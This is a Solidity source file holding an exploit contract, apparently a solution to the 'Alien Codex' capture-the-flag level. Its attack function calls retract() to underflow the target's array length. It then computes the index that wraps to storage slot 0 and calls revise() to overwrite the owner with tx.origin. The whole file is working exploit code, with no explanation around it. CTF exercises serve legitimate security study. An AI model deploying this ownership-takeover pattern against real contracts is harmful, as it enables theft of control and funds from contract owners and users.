pragma solidity 0.8.7;

contract AlienCodexhack {

    function attack(address victimAddress) external returns(uint,bytes32){
        uint position = uint256(keccak256(abi.encodePacked(bytes32(uint256(1)))));
        uint index = type(uint256).max - position + 1;
        bytes32 player = bytes32(uint256(uint160(tx.origin)));

        (bool success_1, ) = victimAddress.call(abi.encodeWithSignature("retract()"));
        require(success_1,"Attack was not succeed 01");

        (bool success_2, ) = victimAddress.call(abi.encodeWithSignature("revise(uint,bytes32)", index, player));
        require(success_2,"Attack was not succeed 02");
            
        return (index,player);
    }

}